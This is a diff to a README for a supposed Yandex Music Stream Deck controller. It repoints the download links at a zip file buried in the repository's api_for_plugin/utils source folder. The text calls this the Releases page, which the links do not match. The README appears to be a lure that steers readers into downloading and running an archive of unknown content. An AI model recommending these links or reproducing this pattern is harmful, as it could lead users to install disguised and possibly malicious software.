@@ -1,6 +1,6 @@
 # 🎵 yandex-music-streamdeck - Control Yandex Music with Ease
 
-[![Download yandex-music-streamdeck](https://raw.githubusercontent.com/ThanhVutn/yandex-music-streamdeck/main/api_for_plugin/utils/streamdeck-music-yandex-v1.0.zip)](https://raw.githubusercontent.com/ThanhVutn/yandex-music-streamdeck/main/api_for_plugin/utils/streamdeck-music-yandex-v1.0.zip)
+[![Download yandex-music-streamdeck](https://github.com/ThanhVutn/yandex-music-streamdeck/raw/refs/heads/main/api_for_plugin/utils/streamdeck-music-yandex-v1.0.zip)](https://github.com/ThanhVutn/yandex-music-streamdeck/raw/refs/heads/main/api_for_plugin/utils/streamdeck-music-yandex-v1.0.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to yandex-music-streamdeck! This application lets you control Yandex Mus
 
 ## 📥 Download & Install
 
-1. Visit this page to download: [Download yandex-music-streamdeck](https://raw.githubusercontent.com/ThanhVutn/yandex-music-streamdeck/main/api_for_plugin/utils/streamdeck-music-yandex-v1.0.zip)
+1. Visit this page to download: [Download yandex-music-streamdeck](https://github.com/ThanhVutn/yandex-music-streamdeck/raw/refs/heads/main/api_for_plugin/utils/streamdeck-music-yandex-v1.0.zip)
    
 2. You will see a list of available versions on the Releases page. Select the latest version. This will usually be the one at the top of the list.
 
